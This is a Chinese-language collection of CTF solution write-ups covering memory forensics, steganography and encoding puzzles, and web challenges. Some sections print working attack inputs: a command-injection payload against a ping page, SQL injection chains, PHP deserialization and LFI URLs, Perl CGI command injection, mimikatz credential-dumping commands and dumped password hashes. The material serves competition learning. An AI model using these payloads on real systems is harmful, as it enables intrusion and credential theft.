\Device\HarddiskVolume2\keyboard-log\t.txt

```
volatility -f "Keyboard.raw" --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 -D ./ -u
```

![image-20200830180720064](/image-20200830180720064.png)

提示abc，应该是qwe键盘解密：

```python
def search(x):
    return{'q':'a','w':'b','e':'c','r':'d','t':'e','y':'f','u':'g','i':'h','o':'i','p':'j','a':'k',
    's':'l','d':'m','f':'n','g':'o','h':'p','j':'q','k':'r',
    'l':'s','z':'t','x':'u','c':'v','v':'w','b':'x','n':'y','m':'z',
    }.get(x,x)
def main():
    print("QWE键盘解密程序")
    print("请输入待解密的字符串：")
    while True:
        try:
            miwen=input()
            miwen=miwen.lower()
            print("结果是：")
            for i in miwen:
                print(search(i),end='')
            print("\n")
        except:
            break

if __name__=="__main__":
    main()
```

veracryptpasswordiskeyboarddraobyek

将该密码转为大写后加载磁盘

![image-20200830181322001](/image-20200830181322001.png)

解压vhd文件，得到一个假flag。文件夹名称提示But I hid it，用winhex检查ntfs流发现flag：

![image-20200830182454145](/image-20200830182454145.png)

###### 8.mem

```
volatility -f "mem.data" imageinfo
```

Win7SP1x64

```
volatility -f "mem.data" --profile=Win7SP1x64 pslist
```

mspaint

```
volatility -f "mem.data" --profile=Win7SP1x64 memdump -p 2768 --dump-dir=./
```

后缀名改为data，用gimp，加了透明通道后调了一万年终于发现flag：

![image-20200830185146469](/image-20200830185146469.png)

###### 9.memory

本题要求获得用户Administrator的密码。

```
volatility -f "memory" imageinfo
```

WinXPSP2x86

```
volatility -f "memory" --profile=WinXPSP2x86 hivelist
volatility -f "memory" --profile=WinXPSP2x86 hashdump -y 0xe101b008 -s 0xe1451b60 > hashs.txt
```

```
Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:132893a93031a4d2c70b0ba3fd87654a:fe572c566816ef495f84fdca382fd8bb:::
```

用ophcrack爆破得到flag

#### 硬盘取证

###### 1

![image-20200906193213585](/image-20200906193213585.png)

![image-20200906193218379](/image-20200906193218379.png)

![image-20200906193222614](/image-20200906193222614.png)

![image-20200906193226571](/image-20200906193226571.png)

![image-20200906193230878](/image-20200906193230878.png)

###### 2

![image-20200906193307393](/image-20200906193307393.png)

![image-20200906193311450](/image-20200906193311450.png)

![image-20200906193315942](/image-20200906193315942.png)

![image-20200906193321351](/image-20200906193321351.png)

###### 

# 强网杯2020

###### 主动

```php
<?php
highlight_file("index.php");

if(preg_match("/flag/i", $_GET["ip"]))
{
    die("no flag");
}

system("ping -c 3 $_GET[ip]");

?> 
```

用;截断，然后用base64构造cat flag.php即可：

```
ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

```
<!--?php $flag = "flag{I_like_qwb_web}"; -->
```

###### upload

给了个流量包，追踪tcp流发现上传了一张叫steghide.jpg的图片，写个脚本读取字典，用steghide爆破即可：

```python
import os
f = open('pass.txt')
for i in f.readlines():
    os.system('steghide extract -sf 1.jpg -p %s'%i[:-1])
```

```
flag{te11_me_y0u_like_it}
```

###### Funhash

```php+HTML
<?php
include 'conn.php';
highlight_file("index.php");
//level 1
if ($_GET["hash1"] != hash("md4", $_GET["hash1"]))
{
    die('level 1 failed');
}

//level 2
if($_GET['hash2'] === $_GET['hash3'] || md5($_GET['hash2']) !== md5($_GET['hash3']))
{
    die('level 2 failed');
}

//level 3
$query = "SELECT * FROM flag WHERE password = '" . md5($_GET["hash4"],true) . "'";
$result = $mysqli->query($query);
$row = $result->fetch_assoc(); 
var_dump($row);
$result->free();
$mysqli->close();


?> 
```

level1用0e251288019绕过，生成脚本：

```python
import hashlib
import string
import itertools
i = 0
prefix = "0e"
while 1:
	if i%1000000 == 0:
		 print prefix + str(i)
	hash1 = hashlib.new("md4", prefix + str(i)).hexdigest()
	if hash1[:2] == "0e" and  hash1[2:].isdigit():
		print prefix + str(i)
		print hash1
		exit()
	i += 1
```

level2用数组配合0e绕过：

```
hash2[]=1&hash3[]=0e
```

level3用ffifdyop绕过

```
http://39.101.177.96/index.php?hash1=0e251288019&hash2[]=1&hash3[]=0e&hash4=ffifdyop
```

```
array(3) { ["id"]=> string(1) "1" ["flag"]=> string(24) "flag{y0u_w1ll_l1ke_h4sh}" ["password"]=> string(32) "641ec1386cb6a65f6831a48be12c8ad1" } 
```

# 钓鱼城杯2020

###### whitespace

有两种空格，需要进行替换

![image-20200906205208447](/image-20200906205208447.png)

把两种空格分别替换成1和0:

![image-20200906205256640](/image-20200906205256640.png)

然后转换为字符串拼起来就好：

```
s = s.split('\n')
for i in s:
    if i != '1':
        print(chr(int(i,2)), end = '')
```

```
flag{nyrdXZESDMz1l5N8837AYZb7STPHCveg}
```

# 高校战“疫”2020

###### 简单MISC

给了一个jpg图片和一个压缩包，jpg图片用foremost得到一个压缩包：

![image-20200906211808051](/image-20200906211808051.png)

解压后发现为摩斯密码：

```
./.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.
```

解码一下：

```python
a = './.--./../-.././--/../-.-./.../../-/..-/.-/-/../---/-./---/..-./..-/-./../...-/./.-./.../../-/-.--/.--/.-/.-.'
s = a.split("/")
dict = {'.-': 'A',
        '-...': 'B',
        '-.-.': 'C',
        '-..':'D',
        '.':'E',
        '..-.':'F',
        '--.': 'G',
        '....': 'H',
        '..': 'I',
        '.---':'J',
        '-.-': 'K',
        '.-..': 'L',
        '--': 'M',
        '-.': 'N',
        '---': 'O',
        '.--.': 'P',
        '--.-': 'Q',
        '.-.': 'R',
        '...': 'S',
        '-': 'T',
        '..-': 'U',
        '...-': 'V',
        '.--': 'W',
        '-..-': 'X',
        '-.--': 'Y',
        '--..': 'Z',
        '.----': '1',
        '..---': '2',
        '...--': '3',
        '....-': '4',
        '.....': '5',
        '-....': '6',
        '--...': '7',
        '---..': '8',
        '----.': '9',
        '-----': '0',
        '..--..': '?',
        '-..-.': '/',
        '-.--.-': '()',
        '-....-': '-',
        '.-.-.-': '.'
        }
for item in s:
    print (dict[item],end='')
```

```
EPIDEMICSITUATIONOFUNIVERSITYWAR
```

作为解压密码用来解压得到一串base字符串：

```
VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=
```

CTFcrack进行base64解码得到flag:

```
Th1s_is_FlaG_you_aRE_rigHT
```

# xtcf

## web

###### i-got-id-200

Perl（.pl）站文件上传

```
POST /cgi-bin/file.pl?/bin/bash%20-c%20ls${IFS}/| HTTP/1.1
Host: 220.249.52.133:45874
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------312623419042421556082293855654
Content-Length: 492
Origin: http://220.249.52.133:45874
Connection: close
Referer: http://220.249.52.133:45874/cgi-bin/file.pl
Cookie: PHPSESSID=0g8sp3lq2esm31ss6265g37l77
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="file";
Content-Type: application/octet-stream

ARGV
-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="file"; filename="test.py"
Content-Type: text/plain

-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------312623419042421556082293855654--
```

```
POST /cgi-bin/file.pl?/flag HTTP/1.1
Host: 220.249.52.133:45874
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------312623419042421556082293855654
Content-Length: 492
Origin: http://220.249.52.133:45874
Connection: close
Referer: http://220.249.52.133:45874/cgi-bin/file.pl
Cookie: PHPSESSID=0g8sp3lq2esm31ss6265g37l77
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="file";
Content-Type: application/octet-stream

ARGV
-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="file"; filename="test.py"
Content-Type: text/plain

-----------------------------312623419042421556082293855654
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------312623419042421556082293855654--
```

# buuctf

## web

###### [极客大挑战 2019]BabySQL

双写绕过注入，需要换库。

密码随便填，从账号处注入。

```
-1' ununionion selselectect 1,2,3-- -

-1' ununionion selselectect 1,group_concat(schema_name),3 frfromom infoorrmation_schema.schemata-- -

-1' uniounionn seleselectct 1,group_concat(table_name),3 frfromom infoorrmation_schema.tables whwhereere table_schema='ctf'-- -

-1' uniunionon selselectect 1,group_concat(column_name),3 ffromrom infoorrmation_schema.columns whewherere table_name='Flag'-- -

-1' ununionion selselectect 1,(selselectect flag frfromom ctf.Flag limit 1),3-- -
```

###### [ZJCTF 2019]NiZhuanSiWei

三个参数，text需要绕过`file_get_contents`；file需要绕过`preg_match`，且有`include`可以利用；password用于反序列化。

`file_get_contents`使用data://text/plain;base64绕过；由于给了提示`useless.php`，不需绕过`preg_match`，利用php://filter/read=convert.base64-encode/resource=在`include`读取`useless.php`源码即可；最后根据`useless.php`的源码构造反序列化即可。

读取useless.php源码：

```
http://2806c537-e61d-44c4-a3c3-4be94f9a3200.node3.buuoj.cn/index.php?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php
```

构造反序列化：

```php
<?php  

class Flag{  //flag.php  
    public $file = "flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  


$s = new Flag();
var_dump(serialize($s));
?>
```

读取flag：

```
http://2806c537-e61d-44c4-a3c3-4be94f9a3200.node3.buuoj.cn/index.php?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:%22Flag%22:1:{s:4:%22file%22;s:8:%22flag.php%22;}
```

###### [极客大挑战 2019]HardSQL

过滤了union，故使用updatexml进行报错注入。

使用like代替=

使用^代替and

使用括号代替空格

使用right代替substr

```
1'^updatexml(1,concat(0x23,database()),1)%23^'1

1'^updatexml(1,concat(0x23,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like'geek'))),1)%23^'1

1'^updatexml(1,concat(0x23,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like'H4rDsq1'))),1)%23^'1

1'^updatexml(1,concat(0x23,(select(password)from(H4rDsq1))),1)%23^'1

1'^updatexml(1,concat(0x23,(select(right(password,30))from(H4rDsq1))),1)%23^'1
```

###### [GXYCTF2019]BabySQli

F12发现search.php，访问后F12发现一串base字符串，一次base32一次base64解密后得到：

```
select * from user where username = '$name'
```

可以利用查询不存在的数据，配合联合查询构造临时数据，绕过密码验证：

```
name: 1'+union+select+1,'admin','e10adc3949ba59abbe56e057f20f883e'#
pw:123456
```

## misc

###### [WUSTCTF2020]find_me

右键查看备注发现是八点盲文，找不到离线工具，在线搞定了：

https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen

###### [GUET-CTF2019]KO

```
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!
Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook!
Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook?
Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!
Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.
Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook.
Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!
Ook. Ook? Ook.
```

```
#!/usr/bin/env python
#
# an Ook! interpreter written in python
#
# you can wrap the memory pointer to the end of the the memory cells
# but you cannot do the same trick to get the first cell, since going
# further out would just initiate a new memory cell.
#
#
# 2003-02-06: Thanks to John Farrell for spotting a bug!

import sys, string, types

def massage(text):
    ret = []
    tok = []

    for line in text:
        if line[0] != ";" and line != "\n" and line != "":
            for token in line.split(" "):
                if token != "":
                    ret.append(token.strip())
    return ret

def sane(code):
    if len(code) % 2 == 0:
        return 1
    else:
        return 0

class OokInterpreter:

    memory = [0]
    memptr = 0
    file   = None
    code   = None
    len    = 0
    codei  = 0

    def __langinit(self):
        self.lang   = {'Ook. Ook?' : self.mvptrup,
                       'Ook? Ook.' : self.mvptrdn,
                       'Ook. Ook.' : self.incptr,
                       'Ook! Ook!' : self.decptr,
                       'Ook. Ook!' : self.readc,
                       'Ook! Ook.' : self.prntc,
                       'Ook! Ook?' : self.startp,
                       'Ook? Ook!' : self.endp}

    def mem(self):
        return self.memory[self.memptr]

    def __init__(self, file):
        self.__langinit()
        self.file = open(file)
        self.code = massage(self.file.readlines())
        self.file.close()
        if not sane(self.code):
            print self.code
            raise "OokSyntaxError", "Code not sane."
        else:
            self.cmds()

    def run(self):
        self.codei = 0
        self.len  = len(self.code)
        while self.codei < self.len:
            self.lang[self.code[self.codei]]()
            self.codei += 1

    def cmds(self):
        i = 0
        l = len(self.code)
        new = []
        while i < l:
            new.append(string.join((self.code[i], self.code[i+1]), " "))
            i += 2
        self.code = new

    def startp(self):
        ook = 0
        i   = self.codei
        if self.memory[self.memptr] != 0:
            return None
        while 1:
            i += 1
            if self.code[i] == 'Ook! Ook?':
                ook += 1
            if self.code[i] == 'Ook? Ook!':
                if ook == 0:
                    self.codei = i
                    break
                else:
                    ook -= 1
            if i >= self.len:
                raise 'OokSyntaxError', 'Unmatched "Ook! Ook?".'

    def endp(self):
        ook = 0
        i   = self.codei
        if self.memory[self.memptr] == 0:
            return None
        if i == 0:
            raise 'OokSyntaxError', 'Unmatched "Ook? Ook!".'
        while 1:
            i -= 1
            if self.code[i] == 'Ook? Ook!':
                ook += 1
            if self.code[i] == 'Ook! Ook?':
                if ook == 0:
                    self.codei = i
                    break
                else:
                    ook -= 1
            if i <= 0:
                raise 'OokSyntaxError', 'Unmatched "Ook? Ook!".'

    def incptr(self):
        self.memory[self.memptr] += 1

    def decptr(self):
        self.memory[self.memptr] -= 1

    def mvptrup(self):
        self.memptr += 1
        if len(self.memory) <= self.memptr:
            self.memory.append(0)

    def mvptrdn(self):
        if self.memptr == 0:
            self.memptr = len(self.memory) - 1
        else:
            self.memptr -= 1

    def readc(self):
        self.memory[self.memptr] = ord(sys.stdin.read(1))

    def prntc(self):
        sys.stdout.write(chr(self.mem()))


if __name__ == '__main__':
    o = OokInterpreter(sys.argv[1])
    o.run()
```

###### 我吃三明治

给了张图片，用formost能分解成两张图片但是啥都没发现。

回去查看原图的二进制，发现两张图中间有点一段数据：

![image-20200927112121964](/image-20200927112121964.png)

用CyberChef的base32解密得到flag，其他程序会报错解不开原因不明。

###### [DDCTF2018](╯°□°）╯︵ ┻━┻

给了一串字符串：

```
d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd
```

分割移动位得到flag：

```
string = "d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd" 
string1 = "" 
for i in range(0, len(string), 2):
    string1 += "0x" 
    string1 += string[i] 
    string1 += string[i+1] 
    string1 += "," 
string1 = string1[:-1] 
print string1 
string2 = [] 
string2 = string1.split(",") 
print string2 
flag = "" 
for i in range(len(string2)): 
    flag += chr(int(string2[i],16)-128) 
print(flag)
```

###### 百里挑一

把流量包中的http文件全部导出，用exiftool找到前半flag：

```
exiftool ./new/*|grep flag
```

后一半在114个tcp流中

###### [SUCTF2018]single dog

给了一张图片

![img](/clip_image001.jpg)

formost得到一个压缩包

![img](/clip_image002.png)

解压后：

![img](/clip_image004.jpg)

aaencode：

![img](/clip_image006.jpg)

###### [WUSTCTF2020]alison_likes_jojo

As we known, Alison is a pretty girl.

给了两张图片：

![img](/clip_image001.png)

发现boki.jpg中有压缩包：

![img](/clip_image002-1602750309015.png)

爆破得到密码：

![img](/clip_image003.png)

解压得到base字符串：

![img](/clip_image004.png)

base64处理两次：

![img](/clip_image005.png)

![img](/clip_image006.png)

![img](/clip_image007.png)

作为密码，用outguess得到flag：

![img](/clip_image008.png)

###### [ACTF新生赛2020]swp

给了个流量包，发现有个压缩文件：

![img](/clip_image002.jpg)

伪加密，ZipCenOp处理下，得到swp文件：

![img](/clip_image004-1602750333875.jpg)

![img](/clip_image005-1602750333876.png)

![img](/clip_image007.jpg)

###### 从娃娃抓起

题目描述：伟人的一句话，标志着一个时代的开始。那句熟悉的话，改变了许多人的一生，为中国三十年来计算机产业发展铺垫了道路。两种不同的汉字编码分别代表了汉字信息化道路上的两座伟大里程碑。请将你得到的话转为md5提交，md5统一为32位小写。

```
0086 1562 2535 5174
bnhn s wwy vffg vffg rrhy fhnv

请将你得到的这句话转为md5提交，md5统一为32位小写。
提交格式：flag{md5}
```

分别是中文电码表和五笔码表

中文电码表：

人0086

工1562

智2535

能5174

五笔码表：

也 BN（BNHN）

要 S

从 WW（WWY）

娃 VFF（VFFG）

娃 VFF（VFFG）

抓 RRHY

起 FHN（FHNV）

 ```python
#'%08.f'
import hashlib
print(hashlib.md5(bytes('人工智能也要从娃娃抓起', encoding='utf-8')).hexdigest())
 ```

###### [安洵杯 2019]Attack

给了一个流量包，追踪http流发现一个dmp文件，lsass.dmp。

lsass.exe保存着系统密码，可以用mimikatz从dump中提取：

```
privilege::debug
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords full
```

foremost处理流量包，得到一个压缩文件，用刚刚得到的系统密码解压得到flag。

###### [MRCTF2020]千层套路

给了一个压缩包，解压密码是文件名，明显是套娃解压：

```python
import zipfile
import re
import os

file_dir = r'C:\Users\hp430\Desktop\attachment\\'
get_files = []

# ts1.getinfo('data.txt').CRC
while True:
    get = False
    for i in os.listdir(file_dir):
        if i not in get_files:
            get = True
            ts1 = zipfile.ZipFile(file_dir + i)
            #ts1.namelist()[0].split('.')[0]
            # res = re.search('[0-9]*',ts1.namelist()[0])
            # passwd = res.group()
            passwd = i.split('.')[0]
            print(passwd)
            ts1.extractall(file_dir,pwd=bytes(passwd, encoding='utf-8'))
            # cmd = '"D:\\Program Files\\7-Zip\\7z.exe" x %s%s -o"%s" -p%s' % (file_dir, i, file_dir, passwd)
	        # subprocess.Popen(cmd)
            zipname = file_dir + ts1.namelist()[0]
            # get_files.append(i)
            ts1 = ''
            while True:
                try:
                    os.remove(file_dir + i)
                    break
                except:
                    pass
    if not get:
        break
```

得到一个内容为(255, 255, 255)形式的txt，像素值转图片即可：

```python
from PIL import Image

x = 200
y = 200
im = Image.new('RGB', (x, y))
with open(r'C:\\Users\\hp430\\Desktop\\attachment\\qr.txt') as f:
    for i in range(x):
        for j in range(y):
            line = f.readline()
            s = line[1:-2].split(', ')
            im.putpixel((i, j), (int(s[0]), int(s[1]), int(s[2])))
im.save(r'C:\\Users\\hp430\\Desktop\\attachment\\rgb.jpg')
```

最后扫描二维码得到flag。

###### 蜘蛛侠呀

提取流量包隐写：

```
tshark -r out.pcap -T fields -e data >out.txt
```

得到一堆16进制hex字符串，解码后是base64，解码成字符串失败。

于是转换成二进制看下：

```python
import base64

f = open(r'C:\\Users\\hp430\Desktop\\fa90d5eb-201d-4c43-a8d5-49731a2ebffe\\out.txt', encoding='utf-8')
f1 = open(r'C:\\Users\\hp430\Desktop\\fa90d5eb-201d-4c43-a8d5-49731a2ebffe\\result.txt', 'w')
for i in f.readlines():
    i = i.strip()
    if i:
        i1 = (bytes().fromhex(i).decode('utf-8').split('$')[-1]) #.decode('utf-8')
        try:
            f1.write(str(base64.b64decode(i1[:-1])))
        except:
            print(i1)
f1.close()
```

发现PK头，同时发现4行一组内容相同，于是用脚本生成压缩包：

```python
import base64
i_max = 4
index = 0
f = open(r'C:\\Users\\hp430\Desktop\\fa90d5eb-201d-4c43-a8d5-49731a2ebffe\\out.txt', encoding='utf-8')
f1 = open(r'C:\\Users\\hp430\Desktop\\fa90d5eb-201d-4c43-a8d5-49731a2ebffe\\result.zip', 'wb')
for i in f.readlines():
    if index != 0:
        index += 1
        if index >= 4:
            index = 0
        continue
    index += 1
    i = i.strip()
    if i:
        i1 = (bytes().fromhex(i).decode('utf-8').split('$')[-1]) #.decode('utf-8')
        try:
            f1.write(base64.b64decode(i1[:-1]))
            
        except:
            print(i1)
f1.close()
```

010editor打开，去掉pk前面的内容即可正常解压，得到一个gif文件。

用identify得到隐藏的信息：

```
identify -format “%T” flag.gif

“20”“50”“50”“20”“50”“50”“20”“50”“20”“50”“20”“20”“20”“50”“20”“20”“20”“20”“50”“50”“20”“50”“20”“50”“20”“50”“20”“50”“50”“50”“50”“50”“20”“20”“50”“50”“20”“20”“20”“50”“20”“50”“50”“50”“20”“50”“20”“20”“66”“66”r
```

20换0，50换1，转成字符串md5后得到flag。

###### [安洵杯 2019]easy misc

给了一堆txt，一张图片和一个压缩包。

打开压缩包，注释提示：

```
FLAG IN ((√2524921X85÷5+2)÷15-1794)+NNULLULL,
```

计算出来得到7，应该是7个数字+NNULLUL,，使用???????NNULLULL,作为掩码爆破得到密码。解压得到密码表：

```
a = dIW
b = sSD
c = adE 
d = jVf
e = QW8
f = SA=
g = jBt
h = 5RE
i = tRQ
j = SPA
k = 8DS
l = XiE
m = S8S
n = MkF
o = T9p
p = PS5
q = E/S
r = -sd
s = SQW
t = obW
u = /WS
v = SD9
w = cw=
x = ASD
y = FTa
z = AE7
```

接着处理图片，foremost得到两张一样的图片，盲水印处理后得到：

```
in 11.txt
```

检查那堆txt文件，发现hint.txt中写着：

```
hint:取前16个字符
```

取频率在前16的字符，再通过密码表得到base64，最后ascii85得到flag：

```python
import re
import base64

dec = '''a = dIW
b = sSD
c = adE 
d = jVf
e = QW8
f = SA=
g = jBt
h = 5RE
i = tRQ
j = SPA
k = 8DS
l = XiE
m = S8S
n = MkF
o = T9p
p = PS5
q = E/S
r = -sd
s = SQW
t = obW
u = /WS
v = SD9
w = cw=
x = ASD
y = FTa
z = AE7'''
go_path = {}
for i in dec.split('\n'):
	d1, d2 = i.split(' = ')
	go_path[d1] = d2

file = open(r'C:\Users\hp430\Desktop\read\11.txt', 'r', encoding='gbk')
line = file.readlines()
file.seek(0,0)
file.close()

result = {}
for i in range(97,123):
	count = 0
	for j in line:
		find_line = re.findall(chr(i),j)
		count += len(find_line)
	result[chr(i)] = count
res = sorted(result.items(),key=lambda item:item[1],reverse=True)

num = 1
result = ['']*16
for x in res:
		print('频数第{0}: '.format(num),x)
		try:
			result[int(format(num))-1] = x[0]
		except:
			break
		num += 1 
print(''.join(result))
vv = ''
for r in result:
	if r in go_path:
		vv += go_path[r]
print(vv)
vvv = print(str(base64.b64decode(vv), encoding='utf-8'))
print(str(base64.a85decode(vvv), encoding='utf-8'))
```

###### [GKCTF2020]Harley Quinn

```
Ivy给Harley发了一个短信……算了，编不下去了，先听后看就完事了……

音频解码可能有误差，密码为有意义的无空格小写短句 解密版本为1.25

HQ

hint:电话音&九宫格

FreeFileCamouflage，下载的文件可能显示乱码
```

给了一个wav音频文件和一个jpg图片，按照提示先用dtmf2num看下wav图片的电话音，得到#222833344477773338866#。对照九宫格表，得到ctfisfun。

之后按照提示，使用该密码用FreeFileCamouflage解密jpg文件得到flag

###### 粽子的来历

```
曹操的私生子曹小明因为爸爸活着的时候得罪太多人，怕死后被抄家，所以把财富保存在一个谁也不知道的地方。曹小明比较喜欢屈原，于是把地点藏在他的诗中。三千年后，小明破译了这个密码，然而却因为担心世界因此掀起战争又亲手封印了这个财富并仿造当年曹小明设下四个可疑文件，找到小明喜欢的DBAPP标记，重现战国辉煌。(答案为正确值(不包括数字之间的空格)的小写32位md5值) 注意：得到的 flag 请包上 flag{} 提交
```

给了4个word文件，但是打开显示损坏。检查二进制发现一堆FF中夹着一段IComeFromxxxx，全部改为FF即可正常打开。

打开发现每行行间距不一样，有1倍的有1.5倍的，猜测二进制。把1.5倍行间距的作为0，1倍行间距的作为1，md5后挨个提交，第三个文件为正确的flag

###### [SCTF2019]电单车

给了一个wav文件，查看波形发现由两种组成：

![image-20210117215358913](/image-20210117215358913.png)

猜测是二进制，但是处理后得到的数据提交不对。

题目是电单车，查了相关材料也没发现啥。

去查原题，发现原题题目要求提交地址位的全部信息，于是根据相关相关材料获得flag：

https://www.freebuf.com/articles/wireless/191534.html

![image-20210117215710405](/image-20210117215710405.png)

###### hashcat

给了一个没后缀名的文件，用file查看没结果，查看二进制头发现是d0cf11e0开头，为excel/word/ppt文件，挨个尝试发现ppt用后缀名可以打开，但是需要密码。

于是用Accent OFFICE Password Recovery爆破，由于没有提示，而且excel/word/ppt爆破比较慢，一般都是4位数字/小写字母/大写字母比较多，爆破得到密码9919。打开ppt在倒数第二页全选把字的颜色换了后发现flag。

###### [*CTF2019]otaku

